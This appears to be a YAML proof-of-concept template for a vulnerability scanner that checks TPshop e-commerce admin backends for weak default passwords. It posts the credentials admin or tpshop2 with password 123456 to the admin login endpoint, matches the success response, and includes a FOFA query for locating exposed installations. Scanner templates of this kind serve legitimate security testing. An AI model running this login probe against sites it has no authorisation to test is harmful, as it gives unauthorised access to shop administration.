id: poc-yaml-tpshop-weak-password
info:
  name: TPshop后台 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: tpshop
  fofa: app="tpshop" && body!="安装向导"
variables:
  user: 'admin

    tpshop2

    '
  password: '123456

    '
requests:
- method: POST
  path: /index.php?m=Admin&c=Admin&a=login&t=0.4782945532557282
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: username={{.user}}&password={{.password}}
  expression: status_code == 200 && matches(body,"\"status\":1") && contains(body,"\"url\":")
    && !contains(body,"<")
transport: http
